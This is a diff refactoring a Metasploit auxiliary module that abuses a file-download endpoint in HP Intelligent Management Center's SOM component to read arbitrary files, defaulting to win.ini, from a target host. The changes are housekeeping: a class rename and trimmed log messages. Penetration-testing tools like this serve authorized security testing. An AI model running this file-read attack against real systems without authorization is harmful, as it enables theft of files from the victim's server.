@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
@@ -40,7 +37,7 @@ class Metasploit3 < Msf::Auxiliary
         Opt::RPORT(8080),
         OptString.new('TARGETURI', [true, 'Path to HP Intelligent Management Center', '/imc']),
         OptString.new('FILEPATH', [true, 'The path of the file to download', 'c:\\windows\\win.ini'])
-      ], self.class)
+      ])
   end
 
   def is_imc_som?
@@ -63,11 +60,11 @@ class Metasploit3 < Msf::Auxiliary
   def run_host(ip)
 
     unless is_imc_som?
-      vprint_error("#{peer} - HP iMC with the SOM component not found")
+      vprint_error("HP iMC with the SOM component not found")
       return
     end
 
-    vprint_status("#{peer} - Sending request...")
+    vprint_status("Sending request...")
     res = send_request_cgi({
       'uri'          => normalize_uri("servicedesk", "servicedesk", "fileDownload"),
       'method'       => 'GET',
@@ -89,9 +86,9 @@ class Metasploit3 < Msf::Auxiliary
         contents,
         fname
       )
-      print_good("#{peer} - File saved in: #{path}")
+      print_good("File saved in: #{path}")
     else
-      vprint_error("#{peer} - Failed to retrieve file")
+      vprint_error("Failed to retrieve file")
       return
     end
   end
